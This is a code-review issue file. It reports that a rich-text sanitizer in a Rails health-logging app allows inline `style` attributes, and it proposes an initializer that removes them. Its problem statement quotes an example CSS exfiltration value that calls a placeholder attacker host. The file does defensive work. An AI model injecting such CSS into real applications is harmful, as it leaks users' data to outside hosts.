---
status: pending
priority: p2
issue_id: "177"
tags: [code-review, security, action-text, lexxy, xss]
dependencies: []
---

# ActionText Allows style Attribute in Rich Text — CSS Data Exfiltration Vector

## Problem Statement
Lexxy's engine.rb adds `style` to ActionText::ContentHelper.allowed_attributes and adds `var` to Loofah's allowed CSS functions. Any user who can write a symptom log or health event note can embed arbitrary inline CSS including `background: url(https://attacker.com/?)` (CSS data exfiltration) or `position: fixed` (clickjacking). These notes are rendered in show views. While the current app is single-user (low practical exploitability), this becomes high-risk if sharing features or multi-tenancy are introduced.

## Proposed Solutions

### Option A
Add an application initializer that runs after Lexxy to remove `style` from allowed attributes:

```ruby
# config/initializers/action_text_sanitization.rb
Rails.application.config.after_initialize do
  ActionText::ContentHelper.allowed_attributes -= %w[style]
end
```

Verify this doesn't break Lexxy's code block syntax highlighting (which uses `data-language`, not `style`).
- Effort: Small
- Risk: Low (test in development first)

## Recommended Action

## Technical Details
- Affected files: config/initializers/ (new file), test symptom_log notes with code blocks to verify no regression

## Acceptance Criteria
- [ ] config/initializers/action_text_sanitization.rb exists and removes `style` from allowed_attributes
- [ ] Initializer runs after Lexxy initializes (uses after_initialize)
- [ ] Inline style attributes in rich text notes are stripped on render
- [ ] Lexxy code block syntax highlighting still works correctly (uses data-language, not style)
- [ ] No visual regressions in existing notes that use Lexxy formatting features

## Work Log
- 2026-03-10: Created via code review
